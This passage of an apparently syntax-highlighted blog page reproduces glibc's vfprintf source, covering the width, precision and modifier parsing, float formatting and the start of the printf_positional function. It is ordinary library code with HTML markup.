class=\"line\"></span><br><span class=\"line\">\ttmp = ++f;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ISDIGIT (*tmp))</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"type\">int</span> pos = read_int (&amp;tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (pos == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t__set_errno (EOVERFLOW);</span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (pos &amp;&amp; *tmp == L_(<span class=\"string\">&#x27;$&#x27;</span>))</span><br><span class=\"line\">\t      <span class=\"comment\">/* The width comes from a positional parameter.  */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\twidth = va_arg (ap, <span class=\"type\">int</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Negative width means left justified.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (width &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    width = -width;</span><br><span class=\"line\">\t    pad = L_(<span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">\t    left = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      JUMP (*f, step1_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Given width in format string.  */</span></span><br><span class=\"line\">    LABEL (width):</span><br><span class=\"line\">      width = read_int (&amp;f);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (width == <span class=\"number\">-1</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  __set_errno (EOVERFLOW);</span><br><span class=\"line\">\t  done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t  <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (*f == L_(<span class=\"string\">&#x27;$&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"comment\">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">      JUMP (*f, step1_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (precision):</span><br><span class=\"line\">      ++f;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (*f == L_(<span class=\"string\">&#x27;*&#x27;</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"type\">const</span> UCHAR_T *tmp;\t<span class=\"comment\">/* Temporary value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t  tmp = ++f;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (ISDIGIT (*tmp))</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"type\">int</span> pos = read_int (&amp;tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (pos == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  __set_errno (EOVERFLOW);</span><br><span class=\"line\">\t\t  done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t  <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (pos &amp;&amp; *tmp == L_(<span class=\"string\">&#x27;$&#x27;</span>))</span><br><span class=\"line\">\t\t<span class=\"comment\">/* The precision comes from a positional parameter.  */</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  prec = va_arg (ap, <span class=\"type\">int</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* If the precision is negative the precision is omitted.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (prec &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    prec = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ISDIGIT (*f))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  prec = read_int (&amp;f);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* The precision was specified in this case as an extremely</span></span><br><span class=\"line\"><span class=\"comment\">\t     large positive value.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (prec == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      __set_errno (EOVERFLOW);</span><br><span class=\"line\">\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tprec = <span class=\"number\">0</span>;</span><br><span class=\"line\">      JUMP (*f, step2_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class=\"line\">    LABEL (mod_half):</span><br><span class=\"line\">      is_short = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step3a_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class=\"line\">    LABEL (mod_halfhalf):</span><br><span class=\"line\">      is_short = <span class=\"number\">0</span>;</span><br><span class=\"line\">      is_char = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class=\"line\">    LABEL (mod_long):</span><br><span class=\"line\">      is_long = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step3b_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class=\"line\"><span class=\"comment\">\t allowed to follow.  */</span></span><br><span class=\"line\">    LABEL (mod_longlong):</span><br><span class=\"line\">      is_long_double = <span class=\"number\">1</span>;</span><br><span class=\"line\">      is_long = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (<span class=\"type\">mod_size_t</span>):</span><br><span class=\"line\">      is_long_double = <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      is_long = <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (<span class=\"type\">mod_ptrdiff_t</span>):</span><br><span class=\"line\">      is_long_double = <span class=\"keyword\">sizeof</span> (<span class=\"type\">ptrdiff_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      is_long = <span class=\"keyword\">sizeof</span> (<span class=\"type\">ptrdiff_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (<span class=\"type\">mod_intmax_t</span>):</span><br><span class=\"line\">      is_long_double = <span class=\"keyword\">sizeof</span> (<span class=\"type\">intmax_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      is_long = <span class=\"keyword\">sizeof</span> (<span class=\"type\">intmax_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process current format.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_int() va_arg (ap, int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_int() va_arg (ap, long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_long_int() va_arg (ap, long long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_pointer() va_arg (ap, void *)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_string() va_arg (ap, const char *)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_int() va_arg (ap, unsigned int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_int() va_arg (ap, unsigned long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wchar_t() va_arg (ap, wchar_t)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wstring() va_arg (ap, const wchar_t *)</span></span><br><span class=\"line\">\t  process_arg ();</span><br><span class=\"line\">\t  process_string_arg ();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_pointer</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_string</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wchar_t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wstring</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tLABEL (form_float):</span><br><span class=\"line\">\tLABEL (form_floathex):</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t      is_long_double = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">printf_info</span> <span class=\"title\">info</span> =</span></span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t.prec = prec,</span><br><span class=\"line\">\t\t.width = width,</span><br><span class=\"line\">\t\t.spec = spec,</span><br><span class=\"line\">\t\t.is_long_double = is_long_double,</span><br><span class=\"line\">\t\t.is_short = is_short,</span><br><span class=\"line\">\t\t.is_long = is_long,</span><br><span class=\"line\">\t\t.alt = alt,</span><br><span class=\"line\">\t\t.space = space,</span><br><span class=\"line\">\t\t.left = left,</span><br><span class=\"line\">\t\t.showsign = showsign,</span><br><span class=\"line\">\t\t.group = group,</span><br><span class=\"line\">\t\t.pad = pad,</span><br><span class=\"line\">\t\t.extra = <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t.i18n = use_outdigits,</span><br><span class=\"line\">\t\t.wide = <span class=\"keyword\">sizeof</span> (CHAR_T) != <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\t.is_binary128 = <span class=\"number\">0</span></span><br><span class=\"line\">\t      &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    PARSE_FLOAT_VA_ARG_EXTENDED (info);</span><br><span class=\"line\">\t    <span class=\"type\">const</span> <span class=\"type\">void</span> *ptr = &amp;the_arg;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"type\">int</span> function_done = __printf_fp_spec (s, &amp;info, &amp;ptr);</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    done_add (function_done);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tLABEL (form_unknown):</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (spec == L_(<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"comment\">/* The format string ended before the specifier is complete.  */</span></span><br><span class=\"line\">\t      __set_errno (EINVAL);</span><br><span class=\"line\">\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* If we are in the fast loop force entering the complicated</span></span><br><span class=\"line\"><span class=\"comment\">\t     one.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The format is correctly handled.  */</span></span><br><span class=\"line\">      ++nspecs_done;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Look for next format specifier.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Write the following constant string.  */</span></span><br><span class=\"line\">      outstring (end_of_spec, f - end_of_spec);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (*f != L_(<span class=\"string\">&#x27;\\0&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Unlock stream and return.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Hand off processing for positional parameters.  */</span></span><br><span class=\"line\">do_positional:</span><br><span class=\"line\">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class=\"line\">\t\t\t    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class=\"line\">\t\t\t    save_errno, grouping, thousands_sep, mode_flags);</span><br><span class=\"line\"></span><br><span class=\"line\"> all_done:</span><br><span class=\"line\">  <span class=\"comment\">/* Unlock the stream.  */</span></span><br><span class=\"line\">  _IO_funlockfile (s);</span><br><span class=\"line\">  _IO_cleanup_region_end (<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"printf-positional\"><a href=\"#printf-positional\" class=\"headerlink\" title=\"printf_positional\"></a>printf_positional</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">printf_positional</span> <span class=\"params\">(FILE *s, <span class=\"type\">const</span> CHAR_T *format, <span class=\"type\">int</span> readonly_format,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   va_list ap, va_list *ap_savep, <span class=\"type\">int</span> done, <span class=\"type\">int</span> nspecs_done,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   <span class=\"type\">const</span> UCHAR_T *lead_str_end,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   CHAR_T *work_buffer, <span class=\"type\">int</span> save_errno,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   <span class=\"type\">const</span> <span class=\"type\">char</span> *grouping, THOUSANDS_SEP_T thousands_sep,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   <span class=\"type\">unsigned</span> <span class=\"type\">int</span> mode_flags)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* For positional argument handling.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">scratch_buffer</span> <span class=\"title\">specsbuf</span>;</span></span><br><span class=\"line\">  scratch_buffer_init (&amp;specsbuf);</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">printf_spec</span> *<span class=\"title\">specs</span> =</span> specsbuf.data;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> specs_limit = specsbuf.length / <span class=\"keyword\">sizeof</span> (specs[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Used as a backing store for args_value, args_size, args_type</span></span><br><span class=\"line\"><span class=\"comment\">     below.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">scratch_buffer</span> <span 